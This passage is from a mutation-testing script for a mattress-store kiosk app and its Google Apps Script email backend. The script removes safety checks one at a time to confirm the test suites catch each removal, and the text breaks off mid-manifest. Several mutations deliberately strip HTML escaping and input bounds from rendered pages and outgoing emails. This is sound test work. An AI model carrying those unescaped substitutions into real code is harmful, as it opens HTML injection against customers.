// Mutation sweep — does the suite actually CATCH each safety property being
// removed?
//
// The behavioural suites answer "does the code do the right thing". This
// answers the question one level up: "would we find out if it stopped". Each
// entry below deletes one safety property from index.html and requires at least
// one suite to go red. A mutation that SURVIVES is a property with no effective
// test, and this file fails on it.
//
// Every mutation is asserted to have applied. A substitution that silently
// matches nothing would leave its assertion passing against unmutated source —
// the exact vacuity this exists to prevent, one level up again.
//
// Nothing is written inside the repository: the tree is copied to a temporary
// directory and mutated there, so a run leaves `git status` untouched.
//
// Run: node tests/mutation_sweep.mjs
//      node tests/mutation_sweep.mjs --list     (print the manifest, run nothing)

import { readFileSync, writeFileSync, mkdirSync, mkdtempSync, cpSync, rmSync } from "node:fs";
import { execFileSync } from "node:child_process";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { tmpdir } from "node:os";

const root = join(dirname(fileURLToPath(import.meta.url)), "..");

// The suites that can observe these properties. Kept explicit rather than
// "every suite", so the runtime stays proportionate and so a survivor cannot be
// explained away by an unrelated suite happening to fail.
//
// Most properties are observable in the recovery suite alone, and running both
// for all of them doubles the wall clock for no added signal. Entries that need
// the session suite name it in a fourth field. If a future change makes some
// property observable ONLY there, this sweep reports it as a SURVIVOR — loudly
// and in the safe direction — and the fix is to widen that entry.
const DEFAULT_SUITES = ["tests/data_error_recovery_check.mjs"];
const WITH_SESSION = DEFAULT_SUITES.concat(["tests/session_safety_check.mjs"]);
// Phase 0.5 observers. The consultation suite owns the compute/state/hf2/
// payload properties; the email suite owns the Code.gs ones; wipe-inventory
// properties need the session suite too.
const PRIORITIES = ["tests/consultation_priorities_check.mjs"];
const PRIORITIES_WITH_SESSION = PRIORITIES.concat(["tests/session_safety_check.mjs"]);
const EMAIL_PRIORITIES = ["tests/email_priorities_check.mjs"];
// Phase 0.6 observer: the consultation-summary suite owns the implication
// resolver, the three hf2 rows, the payload consultation field, and the
// Code.gs consultation rendering on both MIME parts.
const CONSULT = ["tests/consultation_summary_check.mjs"];
// Compare-modal prerequisite observer: the dialog-semantics suite owns the
// labelled-dialog contract, focus lifecycle, localization, listener
// idempotence, and the wipe null-before-close ordering.
const COMPARE = ["tests/compare_modal_check.mjs"];
// Construction reveal repair observer (slice 5a): the repair suite owns the
// two-theme contrast arithmetic, motif ban, equal geometry, forced-colors
// fallback, visibility-based legend hiding, and fill correspondence.
const CONS = ["tests/construction_reveal_repair_check.mjs"];
// Compare entry-point observer: the entry suite owns the card controls,
// ruled tray strings, selection/aria-pressed behavior, handler precedence,
// and the wipe reset.
const CMPE = ["tests/compare_entry_check.mjs"];
// PR 1 integrity observer: the integrity suite owns the retired
// availability claims and the RSA-panel wipe entry.
const INTEGRITY = ["tests/integrity_repairs_check.mjs"];
// Results presentation observer (Slice 1, 2026-08-14): the results suite owns
// the index-only hero/support hierarchy and its absent presentation cap, the
// tier-tab state contract and touch floor, the ruled EN/ES match-ordinal dict
// keys and relativity line, the retired buyer-characterising descriptor, the
// de-rendered synthesized priority rows, and the promotion hooks on both card
// types.
const RESULTS = ["tests/results_presentation_check.mjs"];
// Sleep Brief observer (Slice 2, D1+D2 2026-08-15): the sleep-brief suite owns
// the constellation's determinism/decorative contract and, with the
// recomposition, the D1 structural and behavioral contract.
const BRIEF = ["tests/sleep_brief_presentation_check.mjs"];
// The motion suite owns the review→Sleep Brief transition paths, including
// the reduced-motion hardening of the retained legacy fallback (Slice 2).
const MOTION = ["tests/motion_flag_check.mjs"];
// Quiz presentation observer (Slice 3, item 1.2): the quiz suite owns the
// zero-icon ruling, the two-column grid cap, option order/skip/hide semantics,
// selection and cap/exclusivity behaviour, the aria-pressed state contract,
// the non-color and forced-colors selected cues, the focus wiring, the 44px
// interaction floors, and the keyboard-only focus restoration.
const QUIZ = ["tests/quiz_presentation_check.mjs"];
// Payment Choice observer (Slice 4, item 1.5 / decision D4): the payment suite
// owns the two-dimension state model (payExplored / payPref) and its ephemeral
// disclosure store, the canonical collision-proof path identity, the
// button+panel disclosures, Consider/marker/Clear, "Not right now" and its
// handoff suppression, the exact-identity focus restoration, the two separate
// live regions, the forced-colors geometric cue, and the adopted EN/ES copy.
// Every Payment Choice entry below names an observer EXPLICITLY — none may fall
// through to DEFAULT_SUITES, which observes data-error recovery and would
// report a survivor as a pass.
const PAY = ["tests/payment_choice_check.mjs"];
const PAY_WITH_SESSION = PAY.concat(["tests/session_safety_check.mjs"]);
const PAY_EMAIL = ["tests/email_gating_check.mjs"];
const PAY_ASYNC = ["tests/session_async_check.mjs"];
const PAY_COPY = ["tests/financing_copy_policy_check.mjs"];
const PAY_RENDER = ["tests/financing_render_check.mjs"];
// The validator's own self-test, the one PYTHON observer. It owns the
// config-admission side of Payment Choice: which financing blocks are allowed
// to exist, as distinct from what index.html does with one that does.
const PAY_VALIDATOR = ["tools/validation.py --self-test"];
// Phase 2.1a (dark pricing framework) observers. The validator self-test owns
// validate_pricing's admission rules; the contract suite owns the shipped
// dark state at every layer AND re-runs the populated fixture through the
// real converter + validator, so a validator mutation that admits a corrupted
// fixture is observed twice. Every pricing entry names an observer
// EXPLICITLY - none may fall through to DEFAULT_SUITES.
const PRICING = ["tests/pricing_contract_check.py"];
const PRICING_VALIDATOR = ["tools/validation.py --self-test", "tests/pricing_contract_check.py"];
// Phase 2.1b: the dark-resolver suite executes the REAL resolveDarkPricing
// extracted from index.html, so a resolver mutation is observed by behaviour,
// not by grep. Payload/render leaks are observed by the email-gating and
// sleep-system suites, which own those surfaces' pins.
const PRICING_RESOLVER = ["tests/pricing_resolver_check.mjs"];
// Trust integrity gate observer (2026-08-21): the trust suite owns the copy <->
// engine correspondence (document sections, cited tags, the inert-tag set,
// shipped-vs-documented help lines, banned claims), the absence of the
// heritage rail, the privacy voice and its network-sink pin, and the
// tier-relativity legibility. Entries that mutate a generated or documentary
// target name it with the fifth field.
const TRUST = ["tests/trust_integrity_check.mjs"];
// The contrast suite joins the trust suite as observer for the legibility of
// the three integrity lines (size floors and normal-text contrast).
const TRUST_CONTRAST = TRUST.concat(["tests/contrast_check.mjs"]);
// Slice 5 (Sleep Plan). Every entry below names its observer explicitly.
const PLAN = ["tests/sleep_plan_check.mjs"];
const PLAN_WITH_SESSION = PLAN.concat(["tests/session_safety_check.mjs"]);
const PLAN_WITH_PAY = PLAN.concat(["tests/payment_choice_check.mjs"]);
const PLAN_WITH_PHASE1 = PLAN.concat(["tests/phase1_output_regression_check.mjs"]);
const SESSION = ["tests/session_safety_check.mjs"];
// Sleep System presentation observer (item 1.4): the sleep-system suite owns
// the governed four-step order, the benefit-first/distinction-second card
// hierarchy (DOM order AND relative type size), the separately named
// salesperson procedure region and its freedom from the customer-benefit
// sentence, product distinguishability, the four decision states, the
// fail-closed empty-catalog path, the single catalog-sourced price surface,
// EN/ES state preservation, button/touch semantics, the config-disabled
// financing surface and, since the 2026-08-25 close-out, the CSS pins on the
// rail / notes / statuses and the salesperson-voice procedure copy. Every 1.4
// entry names it EXPLICITLY - none may fall through to DEFAULT_SUITES, which
// observes data-error recovery and would report a survivor as a pass.
const SLEEP = ["tests/sleep_system_presentation_check.mjs"];


// ---------------------------------------------------------------------------
// THE MANIFEST. [label, find, replace] — `find` may span lines; index.html is
// CRLF, so newlines are matched loosely.
// ---------------------------------------------------------------------------
const MUTATIONS = [
  // --- recovery clears what the terminal overlay never did -----------------
  ["recovery does not clear _dataLoadFailed",
    "_dataLoadFailed = false;\n      _startQuizAttempts = 0;", "_startQuizAttempts = 0;"],
  ["recovery does not reset the poll counter",
    "_startQuizAttempts = 0;\n      // A deferred show", "// A deferred show"],
  ["recovery does not disarm a deferred show",
    "_dataErrorDeferred = false;\n      var wasVisible", "var wasVisible"],
  ["hide does not restore aria-hidden",
    "overlay.setAttribute('aria-hidden', 'true');\n      overlay.setAttribute('aria-busy', 'false');",
    "overlay.setAttribute('aria-busy', 'false');"],
  ["hide does not remove the visible class",
    "if (overlay.classList) overlay.classList.remove('visible');", "if (false) {}"],
  ["hide does not clear the status region",
    "overlay.setAttribute('aria-busy', 'false');\n      setDataErrorStatus('');\n      return true;",
    "overlay.setAttribute('aria-busy', 'false');\n      return true;"],

  // --- who may speak -------------------------------------------------------
  ["the loader's stale gate is removed",
    "if (generation !== _dataLoadGeneration) { clearDataErrorBusy(); return 'stale'; }",
    "if (false) { clearDataErrorBusy(); return 'stale'; }"],
  ["the verdict's stale gate is removed",
    "if (generation !== _dataLoadGeneration) { clearDataErrorBusy(); return 'stale'; }\n      // appStartReady()",
    "if (false) { clearDataErrorBusy(); return 'stale'; }\n      // appStartReady()"],
  ["the session guard is removed at the failure path",
    "var verdict = failed ? resolveDataLoadOutcome(generation, sessionUnchanged() === true) : null;",
    "var verdict = failed ? resolveDataLoadOutcome(generation, true) : null;"],
  ["the session guard is removed at the verdict",
    "var owned = sessionUnchanged() === true;", "var owned = true;"],
  ["the silent post-wipe path is removed", "if (opts.silent) return;", "if (false) return;"],
  ["the overlay re-announces on every failure", "if (!wasVisible) {", "if (true) {"],
  ["a stale status survives the first show",
    "setDataErrorStatus('');\n        focusDataError();", "focusDataError();"],

  // --- what counts as loaded ----------------------------------------------
  ["the retry re-fetches everything",
    ".filter(function(src) { return !_dataLoaded[src.key]; })",
    ".filter(function(src) { return true; })"],
  ["first-success-wins is removed",
    "if (_dataLoaded[src.key]) return { src: src, ok: true, duplicate: true };", "if (false) {}"],
  ["the gold tier may be empty",
    "if (!payload.gold.length) throw new Error('mattresses.json has no gold tier');",
    "if (false) throw new Error('mattresses.json has no gold tier');"],
  ["tiers need not be arrays",
    "if (!Array.isArray(payload[tier])) {", "if (false) {"],
  ["entries need no id or firmness",
    "if (!m || typeof m.id !== 'string' || !m.id) {", "if (false) {"],
  ["duplicate ids are allowed",
    "if (ids[m.id]) throw new Error('mattresses.json has duplicate id ' + m.id);", "if (false) {}"],
  ["the payload is assigned wholesale again",
    "MATTRESSES = { gold: payload.gold, silver: payload.silver, bronze: payload.bronze };",
    "MATTRESSES = payload;"],
  ["store-config accepts anything",
    "if (!payload || typeof payload !== 'object' || Array.isArray(payload)) {\n            throw new Error('store-config.json is not an object');\n          }",
    "if (false) { throw new Error('store-config.json is not an object'); }"],
  ["the quiz may have no questions",
    "if (!questions.length) throw new Error('quiz.json has no questions');", "if (false) {}"],
  ["accessories become fatal",
    "key: 'accessories', url: './data/accessories.json', core: false,",
    "key: 'accessories', url: './data/accessories.json', core: true,"],
  ["accessories no longer degrade to []",
    "if (!_dataLoaded.accessories) ACCESSORIES = [];", "if (false) {}"],

  // --- the appliers --------------------------------------------------------
  ["a throwing applier is still a success",
    "if (!appStartReady()) {", "if (!coreDataReady()) {"],
  // Anchored to the CATCH, not to the identifier: the declaration is also
  // `_appliersApplied = false;` and mutating that one only changes the initial
  // value, which the catch immediately corrects — a mutant that behaves
  // correctly and therefore proves nothing.
  ["the applier flag is never cleared",
    "_appliersApplied = false;\n              console.error('[DreamFinder] Post-load application failed:',",
    "console.error('[DreamFinder] Post-load application failed:',"],
  ["appliers run after a wipe", "if (owned) {\n          // Each applier", "if (true) {\n          // Each applier"],
  ["startQuiz no longer waits for the appliers",
    "|| QUESTIONS.length === 0 || !appStartReady()) {", "|| QUESTIONS.length === 0) {"],

  // --- bounded requests ----------------------------------------------------
  ["the fetch deadline never fires",
    "var dataDeadlineTimer = setTimeout(function() {", "var dataDeadlineTimer = 0; (function() {"],
  // Deliberately NOT a manifest entry: "the deadline resolves instead of
  // rejecting" is not a distinct safety property. Either way the load settles,
  // the latch releases and the payload fails validation, so the outcome is the
  // same — and a mutation with no behavioural difference cannot be caught by
  // any test worth writing. What matters is that the deadline FIRES, which the
  // entry above it covers.
  ["responses are not status-checked",
    "if (!res || !res.ok) throw new Error(label + ' HTTP '", "if (false) throw new Error(label + ' HTTP '"],

  // --- the dictionary ------------------------------------------------------
  ["the installed language is not recorded",
    "if (typeof _dictInstalledFor !== 'undefined') _dictInstalledFor = loaded.lang;\n      return loaded.lang;",
    "return loaded.lang;"],
  ["the fallback claims the language that was asked for",
    "return { lang: 'en', dict: fallbackBody };", "return { lang: lang, dict: fallbackBody };"],
  ["an empty dictionary body is installed",
    "if (!loaded || !loaded.dict || !Object.keys(loaded.dict).length) return '';",
    "if (!loaded || !loaded.dict) return '';"],
  ["the dictionary ordering token is removed",
    "if (sequenced && token !== _langRequestSeq) return '';", "if (false) return '';"],
  ["the dictionary is re-fetched every time",
    "if (_dictInstalledFor !== currentLang) await loadDictionary(currentLang);",
    "if (true) await loadDictionary(currentLang);"],

  // --- focus and modal ownership ------------------------------------------
  ["Tab is taken from the layer above",
    "if (overlay.hasAttribute && overlay.hasAttribute('inert')) return;\n      if (typeof safetyDialogMode === 'function' && safetyDialogMode() !== null) return;",
    "if (false) return;"],
  ["Tab containment ignores visibility",
    "if (!e || e.key !== 'Tab' || !dataErrorVisible()) return;", "if (!e || e.key !== 'Tab') return;"],
  ["the container hand-off is removed",
    "if (active === overlay || !dataErrorOwnsFocus()) {", "if (false) {"],
  ["the Tab cycle no longer wraps",
    "if (e.shiftKey && active === first) { e.preventDefault(); last.focus(); }\n      else if (!e.shiftKey && active === last) { e.preventDefault(); first.focus(); }",
    "if (false) {}"],
  ["the keydown handler is registered as a no-op",
    "document.addEventListener('keydown', dataErrorKeydown);",
    "document.addEventListener('keydown', function() {});"],
  ["recovery focuses Welcome from any screen",
    "if (onWelcome && typeof focusWelcomeEntry === 'function') focusWelcomeEntry();\n      else if (typeof focusActiveScreen === 'function') focusActiveScreen();",
    "if (typeof focusWelcomeEntry === 'function') focusWelcomeEntry();"],
  ["recovery moves focus even when nothing was shown",
    "if (!wasVisible || !mayFocus) return;", "if (false) return;"],
  // The two properties the recovery suite cannot see: they live in the Gate 1B
  // dialog, which only the session suite executes.
  //
  // "Visible" is not grounds to outrank an opener that is INSIDE the visible
  // layer. Remove the containment preference and a customer who was on Try
  // again when the timeout warning opened gets the whole dialog re-announced
  // and loses their place on Continue.
  ["the layer root outranks even an opener inside the layer",
    "if (openerInsideLayer && isFocusRestorable(target)) {", "if (false) {",
    WITH_SESSION],
  ["the safety dialog restores focus behind a visible overlay",
    "} else if (errorVisible && typeof errorLayer.focus === 'function') {",
    "} else if (false && typeof errorLayer.focus === 'function') {",
    WITH_SESSION],

  // --- the session inventory ----------------------------------------------
  ["the layer leaves the session-layer close list",
    "{ id: 'dataErrorOverlay', remove: ['visible'], display: 'none',\n        attrs: { 'aria-hidden': 'true', 'aria-busy': 'false' } },", ""],
  ["closing the layer no longer restores aria-hidden",
    "attrs: { 'aria-hidden': 'true', 'aria-busy': 'false' } },\n      { id: 'privacyOverlay'",
    "},\n      { id: 'privacyOverlay'"],
  ["the announcement region leaves the text inventory",
    "'sessionSafetyLive', 'dataErrorLive',", "'sessionSafetyLive',"],

  // --- the controls and their copy ----------------------------------------
  ["the retry latch is removed", "if (_dataLoadInFlight) {", "if (false) {"],
  ["aria-busy is raised before the status is written",
    "setDataErrorStatus(L(DATA_ERROR_COPY.retrying));\n      if (overlay) overlay.setAttribute('aria-busy', 'true');",
    "if (overlay) overlay.setAttribute('aria-busy', 'true');\n      setDataErrorStatus(L(DATA_ERROR_COPY.retrying));"],
  ["clean restart stops delegating to the canonical wipe",
    "if (typeof window.startOver !== 'function') return undefined;\n      return window.startOver();",
    "return undefined;"],
  ["the boot rejection goes unhandled again",
    "loadAppData().catch(function(err) {", "loadAppData(); (function(err) {"],
  ["the Spanish retry label becomes English",
    "retry:       { en: 'Try again', es: 'Intentar de nuevo' },",
    "retry:       { en: 'Try again', es: 'Try again' },"],
  ["the Spanish title becomes English",
    "es: 'Tenemos problemas para cargar' },", "es: 'We’re having trouble loading' },"],

  // --- found by an independent vacuity audit of the suite itself ----------
  ["Tab containment runs on every key, not just Tab",
    "if (!e || e.key !== 'Tab' || !dataErrorVisible()) return;",
    "if (!e || !dataErrorVisible()) return;"],
  ["recovery moves focus even when no overlay was shown",
    "if (!wasVisible || !mayFocus) return;", "if (!mayFocus) return;"],
  ["the microtask hop before the session guard binds is removed",
    "await null;", ";"],
  ["a superseded load releases the current load's latch",
    "if (generation === _dataLoadGeneration) _dataLoadInFlight = false;",
    "_dataLoadInFlight = false;"],
  ["accessories are applied without a shape check",
    "if (!Array.isArray(payload)) throw new Error('accessories.json is not an array');",
    "if (false) {}"],
  ["the white-label lookup tables stop being hydrated",
    "SUBBRAND_NOTES    = (STORE_CONFIG.salesNotes && STORE_CONFIG.salesNotes.subBrands) || {};",
    "SUBBRAND_NOTES    = {};"],
  // Targets the RECOVERY inside the catch, not the logging beside it. The
  // first version of this entry disabled only the console.error and survived,
  // correctly — a mutant that still shows the overlay has removed no safety
  // property. Same mistake as the applier-flag entry above: aim at the line
  // that carries the guarantee.
  ["the boot catch is disabled while keeping its shape",
    "      showDataError();\n    });", "      if (false) showDataError();\n    });"],
  ["the layer is focused before it is made visible",
    "if (overlay.classList) overlay.classList.add('visible');",
    "if (overlay.classList) setTimeout(function() { overlay.classList.add('visible'); }, 0);"],
  ["the accessibility contract moves off the root onto the inner panel",
    '<div id="dataErrorOverlay" role="alertdialog" aria-modal="true" tabindex="-1"',
    '<div id="dataErrorOverlay" data-role="alertdialog" data-modal="true"'],
  ["the base display:none rule is deleted",
    "#dataErrorOverlay { display:none !important; }", ""],
  ["the sr-only rule the status region depends on is deleted",
    "clip: rect(0 0 0 0);", "clip: auto;"],

  // --- the markup contract -------------------------------------------------
  ["the layer reverts to a live region",
    '<div id="dataErrorOverlay" role="alertdialog" aria-modal="true" tabindex="-1"',
    '<div id="dataErrorOverlay" role="status" aria-live="polite" tabindex="-1"'],
  ["the layer loses its accessible name",
    'aria-labelledby="dataErrorTitle" aria-describedby="dataErrorText"', ""],
  ["the retry control loses its touch handler",
    'ontouchend="event.preventDefault();window.dataErrorRetry();"', ""],
  ["the rule that makes the layer visible is deleted",
    "#dataErrorOverlay.visible { display:flex !important; }", ""],

  // ==== Phase 0.5 — consultation priorities ================================
  // --- the engine's order, count and bilingual store -----------------------
  ["the priority sort is reversed",
    "priorities.sort(function(a, b) { return b.score - a.score; });",
    "priorities.sort(function(a, b) { return a.score - b.score; });", PRIORITIES],
  ["the priority sort is removed",
    "priorities.sort(function(a, b) { return b.score - a.score; });", "", PRIORITIES],
  ["the top-three bound is widened",
    "var topPriorities = priorities.slice(0, 3);",
    "var topPriorities = priorities.slice(0, 10);", PRIORITIES],
  // Anchor updated for the Slice 2 disclosure accordion (the row renderer now
  // takes the index too); the property — engine order IS render order — is
  // unchanged, and both observers still see it.
  ["the Sleep Brief list renders reversed",
    "prioritiesEl.innerHTML = topPriorities.map(function(p, i) {",
    "prioritiesEl.innerHTML = topPriorities.slice().reverse().map(function(p, i) {", PRIORITIES],
  ["the stored state loses its Spanish prose",
    "why: { en: priority.whyEn, es: priority.whyEs },",
    "why: { en: priority.whyEn, es: priority.whyEn },", PRIORITIES],
  ["the stored state loses the testing prompts",
    "test: { en: priority.testEn, es: priority.testEs }",
    "test: { en: priority.testEn, es: '' }", PRIORITIES],

  // --- the Consultation Summary render -------------------------------------
  ["the hf2 render reverses the stored order",
    "list.innerHTML = valid.map(function(item) {",
    "list.innerHTML = valid.slice().reverse().map(function(item) {", PRIORITIES],
  ["the hf2 section never hides on empty state",
    "list.innerHTML = '';\n        section.style.display = 'none';\n        return;",
    "list.innerHTML = '';\n        section.style.display = '';\n        return;", PRIORITIES],
  ["the hf2 render drops the reason text",
    "+ escapeHtml(item.why[currentLang] || item.why.en)",
    "+ ''", PRIORITIES],
  ["the hf2 render drops the testing prompt",
    "+ escapeHtml(item.test[currentLang] || item.test.en)",
    "+ ''", PRIORITIES],
  ["the hf2 render stops escaping",
    "+ '<strong>' + escapeHtml(L(item)) + '</strong>",
    "+ '<strong>' + L(item) + '</strong>", PRIORITIES],
  // STATIC-CONTRACT entry: caught by the copy-map pin, not by a render
  // (the label is written by renderHf2's copy loop, which the suite does not
  // execute). The email suite covers the ES label behaviorally.
  ["the hf2 label loses its Spanish (static contract)",
    "hf2PrioritiesLabel: es ? 'Lo que probaremos juntos' : 'What we will test together',",
    "hf2PrioritiesLabel: 'What we will test together',", PRIORITIES],

  // --- the payload projection ----------------------------------------------
  // Reversal INSIDE the projection body, so the suite's extraction still
  // matches and the wrong order is OBSERVED — mutating the regex's literal
  // prefix instead was caught only by the extraction failing, which the
  // sweep's own rules call a boundary, not proof.
  ["the payload ships the stored order reversed",
    ".slice(0, 3)\n          .map(function(item) {",
    ".slice(0, 3).reverse()\n          .map(function(item) {",
    PRIORITIES],
  ["the payload cap is widened",
    ".slice(0, 3)\n          .map(function(item) {",
    ".slice(0, 10)\n          .map(function(item) {", PRIORITIES],
  ["the payload grows an extra key",
    "name: str(item && (item[currentLang] || item.en)),",
    "name: str(item && (item[currentLang] || item.en)), raw: item,", PRIORITIES],
  ["the payload stops pre-localizing the reason",
    "reason: str(item && item.why && (item.why[currentLang] || item.why.en)),",
    "reason: str(item && item.why && item.why.en),", PRIORITIES],
  ["slice6: the payload gate throws on a non-string priority field again",
    "var str = function(v) { return typeof v === 'string' ? v : ''; };",
    "var str = function(v) { return v || ''; };", PRIORITIES],

  // --- the wipe inventories -------------------------------------------------
  ["the hf2 list leaves the wipe's content inventory",
    "'hf2SleepSystemSection', 'hf2Priorities',",
    "'hf2SleepSystemSection',", PRIORITIES_WITH_SESSION],
  // STATIC-CONTRACT entry: the layer entry is belt-and-braces on top of the
  // renderer's own hide (which IS behaviorally covered); its pin is static.
  ["the hf2 section leaves the session layers (static contract)",
    "{ id: 'hf2PrioritiesSection', display: 'none' },", "", PRIORITIES],
  ["the wipe stops clearing the priority store",
    "analytics.trialFocus = [];", "analytics.trialFocus = analytics.trialFocus;",
    ["tests/session_safety_check.mjs"]],

  // --- Code.gs ---------------------------------------------------------------
  ["Code.gs: the priorities cap is removed",
    "})(_safeArray(data.priorities).slice(0, MAX_EMAIL_PRIORITIES).map(function(p) {",
    "})(_safeArray(data.priorities).map(function(p) {",
    EMAIL_PRIORITIES, "Code.gs"],
  ["Code.gs: the array coercion is bypassed",
    "})(_safeArray(data.priorities).slice(0, MAX_EMAIL_PRIORITIES).map(function(p) {",
    "})((data.priorities || []).slice(0, MAX_EMAIL_PRIORITIES).map(function(p) {",
    EMAIL_PRIORITIES, "Code.gs"],
  ["Code.gs: the name bound is removed",
    "name: _safeText(p && p.name, 200),",
    "name: p && p.name,",
    EMAIL_PRIORITIES, "Code.gs"],
  ["Code.gs: the HTML section stops escaping the name",
    "+ '<strong>' + (i + 1) + '. ' + _escapeHtml(pr.name) + '</strong>'",
    "+ '<strong>' + (i + 1) + '. ' + pr.name + '</strong>'",
    EMAIL_PRIORITIES, "Code.gs"],
  ["Code.gs: the HTML section stops escaping the reason",
    "+ (pr.reason ? ' &mdash; ' + _escapeHtml(pr.reason) : '')",
    "+ (pr.reason ? ' &mdash; ' + pr.reason : '')",
    EMAIL_PRIORITIES, "Code.gs"],
  ["Code.gs: the EN plain-text branch drops the priorities (HTML-only rendering)",
    "+ (priorityLines ? 'What we will test together:\\n' + priorityLines + '\\n' : '')",
    "",
    EMAIL_PRIORITIES, "Code.gs"],
  ["Code.gs: the ES plain-text branch drops the priorities",
    "+ (priorityLines ? 'Lo que probaremos juntos:\\n' + priorityLines + '\\n' : '')",
    "",
    EMAIL_PRIORITIES, "Code.gs"],
  ["Code.gs: plain text stops stripping angle brackets",
    "var _plainPriority = function(s) { return String(s || '').replace(/[<>]/g, ''); };",
    "var _plainPriority = function(s) { return String(s || ''); };",
    EMAIL_PRIORITIES, "Code.gs"],
  ["Code.gs: the projection becomes a passthrough",
    "return {\n          name: _safeText(p && p.name, 200),\n          reason: _safeText(p && p.reason, 400),\n          test: _safeText(p && p.test, 400)\n        };",
    "return Object.assign({}, p, { name: _safeText(p && p.name, 200) });",
    EMAIL_PRIORITIES, "Code.gs"],
  // P2 (Codex, PR #16): the normal SUCCESSFUL send used to ship a one-sentence
  // stub as its text/plain part, so a text-only client got no priorities on
  // the ordinary path. The first two mutations touch NOTHING except the
  // successful send's body argument — the HTML part and the whole fallback
  // path stay intact — so only a success-path text-body assertion can catch
  // them; a suite that only ever inspected the fallback would let them
  // survive. The third proves the fallback observers still bite now that the
  // catch reuses the shared body instead of building its own.
  ["Code.gs: the successful send's text part reverts to the stub",
    "GmailApp.sendEmail(email, subject, plainBody, mailOptions);",
    "GmailApp.sendEmail(email, subject, isEs ? 'Por favor visualiza este correo en un cliente de correo HTML.' : 'Please view in an HTML email client.', mailOptions);",
    EMAIL_PRIORITIES, "Code.gs"],
  ["Code.gs: the successful send's text part is emptied",
    "GmailApp.sendEmail(email, subject, plainBody, mailOptions);",
    "GmailApp.sendEmail(email, subject, '', mailOptions);",
    EMAIL_PRIORITIES, "Code.gs"],
  ["Code.gs: the fallback stops reusing the shared plain body",
    "GmailApp.sendEmail(email, subject, plainBody, fallbackOptions);",
    "GmailApp.sendEmail(email, subject, 'Please view in an HTML email client.', fallbackOptions);",
    EMAIL_PRIORITIES, "Code.gs"],
  // Found by the adversarial review of the fix above: the three entries
  // before this one are each caught by MANY assertions, so the suite's
  // drift-equality check (success text part === fallback body) had no
  // mutation that only IT could catch — delete that check and the sweep
  // stayed green. This mutant keeps both bodies full-length and well-formed
  // but not identical, so every content assertion passes and the equality
  // is the sole observer.
  ["Code.gs: the two sends' plain bodies drift apart",
    "GmailApp.sendEmail(email, subject, plainBody, fallbackOptions);",
    "GmailApp.sendEmail(email, subject, buildPlainBody(safeData, isEs, storeName + '.'), fallbackOptions);",
    EMAIL_PRIORITIES, "Code.gs"],

  // --- the Sleep Brief pin ---------------------------------------------------
  // Anchor updated for the Slice 2 disclosure panel, which now carries the
  // reason prose; the property — the render reads the language-RESOLVED
  // field, never the English one — is unchanged.
  ["the Sleep Brief render reads a widened field instead of the resolved one",
    "+ '<p class=\"noct-profile-priority-why\">' + escapeHtml(p.why) + '</p>'",
    "+ '<p class=\"noct-profile-priority-why\">' + escapeHtml(p.whyEn) + '</p>'",
    PRIORITIES],
  ["the brief summary stops resolving Spanish names",
    "var name = lang === 'es' ? priority.nameEs : priority.nameEn;",
    "var name = priority.nameEn;",
    PRIORITIES],

  // ==== Phase 0.6 — consultation implications ==============================
  // --- the resolver's fail-closed contract ---------------------------------
  ["a missing implication falls back to the quiz label",
    "return (typeof v === 'string') ? v.trim() : '';",
    "return (typeof v === 'string' && v.trim()) ? v.trim() : answerLabelFor(questionId, optionId);",
    CONSULT],
  ["a missing implication leaks the raw option id",
    "return (typeof v === 'string') ? v.trim() : '';",
    "return (typeof v === 'string') ? v.trim() : optionId;",
    CONSULT],
  // Codex (PR #17 final review): blank-only values must be true omissions on
  // every layer. This mutant removes the CLIENT's trim so a whitespace entry
  // survives the non-empty filter and joins as an orphan fragment.
  ["a whitespace-only implication renders as a fragment",
    "return (typeof v === 'string') ? v.trim() : '';",
    "return (typeof v === 'string') ? v : '';",
    CONSULT],
  ["the mapping is looked up by label text instead of id",
    "var v = q[optionId];",
    "var v = q[answerLabelFor(questionId, optionId)];",
    CONSULT],
  ["Spanish resolves through the English map",
    "var map = currentLang === 'es' ? CONSULT_IMPLICATIONS_ES : CONSULT_IMPLICATIONS;",
    "var map = CONSULT_IMPLICATIONS;",
    CONSULT],
  ["an unresolvable size label leaks the raw id again",
    "if (!opt) return '';",
    "if (!opt) return optionId;",
    CONSULT],

  // --- one view-model, two consumers ---------------------------------------
  // Each side of the shared resolver mutated ALONE, so only a DOM===payload
  // (or exact-content) assertion can notice — the other surface stays right.
  ["the payload consultation drifts from the DOM rows",
    "consultation: resolveConsultationSummary(),",
    "consultation: (function(vm) { vm.who = vm.who + '.'; return vm; })(resolveConsultationSummary()),",
    CONSULT],
  ["the hf2 rows stop rendering the resolved strings",
    "var vm = resolveConsultationSummary();",
    "var vm = { context: '', who: '', profile: '' };",
    CONSULT],

  // --- the hydration ---------------------------------------------------------
  // The suite extracts these lines by their ANCHOR (the BRAND_NOTES_ES line
  // above them), tolerant of the right-hand side — so a blanked map is still
  // executed and caught by the "maps populate" assertions, not by an
  // extraction boundary.
  ["the consultation maps stop being hydrated",
    "CONSULT_IMPLICATIONS    = (STORE_CONFIG.salesNotes && STORE_CONFIG.salesNotes.consultationImplications) || {};",
    "CONSULT_IMPLICATIONS    = {};",
    CONSULT],
  ["the Spanish consultation map stops being hydrated",
    "CONSULT_IMPLICATIONS_ES = (STORE_CONFIG.salesNotes_es && STORE_CONFIG.salesNotes_es.consultationImplications) || {};",
    "CONSULT_IMPLICATIONS_ES = {};",
    CONSULT],
  // Adversarial finding F3: blanking a map was caught, SWAPPING the two was
  // not — both maps still count six questions while English kiosks render
  // Spanish copy. Content-equality assertions in the suite own these.
  ["the EN hydration reads the Spanish block",
    "CONSULT_IMPLICATIONS    = (STORE_CONFIG.salesNotes && STORE_CONFIG.salesNotes.consultationImplications) || {};",
    "CONSULT_IMPLICATIONS    = (STORE_CONFIG.salesNotes_es && STORE_CONFIG.salesNotes_es.consultationImplications) || {};",
    CONSULT],
  ["the ES hydration reads the English block",
    "CONSULT_IMPLICATIONS_ES = (STORE_CONFIG.salesNotes_es && STORE_CONFIG.salesNotes_es.consultationImplications) || {};",
    "CONSULT_IMPLICATIONS_ES = (STORE_CONFIG.salesNotes && STORE_CONFIG.salesNotes.consultationImplications) || {};",
    CONSULT],

  // --- Code.gs ---------------------------------------------------------------
  // Slice 6 re-anchor: both plain branches now route the brief prose through
  // _plainBrief(priorityLines) and the consultation block follows it.
  ["Code.gs: the EN plain branch drops the consultation lines",
    "+ _plainLead()\n      + _plainBrief(priorityLines)\n      + consultBlock\n      + (priorityLines ? 'What we will test together:",
